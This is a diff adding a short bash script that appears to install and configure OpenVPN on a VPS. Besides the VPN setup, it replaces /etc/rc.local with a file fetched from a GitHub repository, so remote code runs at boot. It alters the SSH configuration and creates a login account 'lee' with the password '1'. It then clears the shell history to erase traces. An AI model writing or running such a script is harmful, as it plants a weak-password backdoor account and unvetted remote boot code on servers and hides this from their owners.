@@ -1,0 +1,23 @@
+#!/bin/bash
+myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
+myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
+if [ $USER != 'root' ]; then
+echo "Sorry, for run the script please using root user"
+exit 1
+fi
+
+# openvpn
+apt-get -y install openvpn
+wget -O /etc/openvpn/openvpn.zip "https://raw.githubusercontent.com/llxxdd/game/master/openvpn.zip"
+cd /etc/openvpn/;unzip openvpn.zip;rm openvpn.zip
+wget -O /etc/rc.local "https://raw.githubusercontent.com/llxxdd/game/master/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/llxxdd/game/master/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/llxxdd/game/master/client.ovpn"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash lee
+echo "lee:1" | chpasswd
+service openvpn restart
+cat /dev/null > ~/.bash_history && history -c
